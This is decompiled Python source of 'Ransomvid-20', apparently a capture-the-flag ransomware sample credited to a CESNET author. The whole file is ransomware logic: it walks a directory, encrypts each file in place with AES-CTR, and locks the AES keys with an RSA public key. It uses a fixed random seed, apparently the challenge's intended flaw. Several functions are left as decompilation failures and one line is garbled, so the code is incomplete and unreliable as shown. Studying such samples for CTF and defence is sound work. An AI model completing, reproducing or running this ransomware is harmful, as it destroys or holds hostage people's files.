# Source Generated with Decompyle++
# File: ransomvid_20.pyc (Python 3.6)

'''
CTF - Ransomvid-20
'''
__author__ = 'Ale\xc5\xa1 Padrta @ CESNET.CZ'
__version__ = '1.0'
import argparse
import random
from os import walk
import pyaes
import rsa

def get_args():
    '''
\tCmd line argument parsing (preprocessing)
\t'''
    parser = argparse.ArgumentParser('Ransomvid-20 (!!!I can really hurt, if you run me!!!)', **('description',))
    parser.add_argument('-p', '--path', str, 'Path to encrypt', True, **('type', 'help', 'required'))
    parser.add_argument('-k', '--keyfile', str, 'The RSA public key', True, **('type', 'help', 'required'))
    args = parser.parse_args()
    return (args.path, args.keyfile)


def get_filenames(path):
    '''
\tGet list of files to encrypt in given path
\t'''
    filenames = []
    for root, directories, files in walk(path):
        for name in files:
            if name.split('.')[-1] not in ('mpeg', 'avi', 'mp4', 'dd'):
                filenames.append('{}/{}'.format(root, name).replace('\\', '/'))
    
    filenames.sort()
    return filenames


def init_random(myseed):
    '''
\tInitialize randomization by defining seed
\t'''
    random.seed(myseed)


def get_random_aes_key(length):
    '''
\tGenerate random AES key
\t'''
    key = bytearray((lambda .0: pass)(range(length)))
    return key


def aes_encrypt(data, aeskey):
    '''
\tEncrypt/decrypt data by provided AES key
\t'''
    aes = pyaes.AESModeOfOperationCTR(aeskey)
    encdata = aes.encrypt(data)
    return encdata


def read_rsakey(filename):
    '''
\tRead RSA encryption key from file
\t'''
    pass
# WARNING: Decompyle incomplete


def rsa_encrypt(data, key):
    '''
\tEncrypt data by provided RSA key (public part)
\t'''
    encdata = rsa.encrypt(data, key)
    return encdata


def read_file(filename):
    '''
\tRead content of file to variable
\t'''
    pass
# WARNING: Decompyle incomplete


def write_file(filename, key, data, orig_len):
    '''
\tWrite header + encrypted content to file
\t'''
    pass
# WARNING: Decompyle incomplete


def main():
    '''
\tMain ransom function
\t'''
    (path, rsakeyfile) = get_args()
    filenames = get_filenames(path)
    print('Found {} files'.format(len(filenames)))
    if filenames:
        for filename in filenames:
            print('  {}'.format(filename))
        
    rsakey = read_rsakey(rsakeyfile)
    init_random(2020)
    for filename in filenames:
        aeskey = get_random_aes_key(32)
        data = read_file(filename)
        enc_data = aes_encrypt(data, aeskey)
        enc_aeskey = rsa_encrypt(aeskey, rsakey)
        write_file('{}'.format(filename), enc_aeskey, enc_data, len(data))
    

main()
